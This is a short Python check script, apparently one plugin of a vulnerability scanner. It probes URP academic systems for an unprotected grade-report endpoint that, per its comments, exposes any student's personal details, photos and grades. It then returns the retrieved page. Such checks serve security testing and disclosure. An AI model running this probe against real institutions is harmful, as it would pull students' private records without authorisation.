#!/usr/bin/env python
# -*- coding: utf-8 -*- 
'''
name: urp查询接口曝露
referer: http://www.wooyun.org/bugs/wooyun-2010-025424
author: Lucifer
description: urp查询接口未设置权限，可以越权查询任意学生信息，照片，成绩等
'''
import sys
import requests
import warnings
from termcolor import cprint

class urp_query_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/reportFiles/cj/cj_zwcjd.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"成绩单" in req.text:
                cprint("[+]存在urp查询接口曝露漏洞...(中危)\tpayload: "+vulnurl, "yellow")
                return True, vulnurl, "urp查询接口曝露", str(payload), req.text
            else:
                cprint("[-]不存在urp_query漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = urp_query_BaseVerify(sys.argv[1])
    testVuln.run()
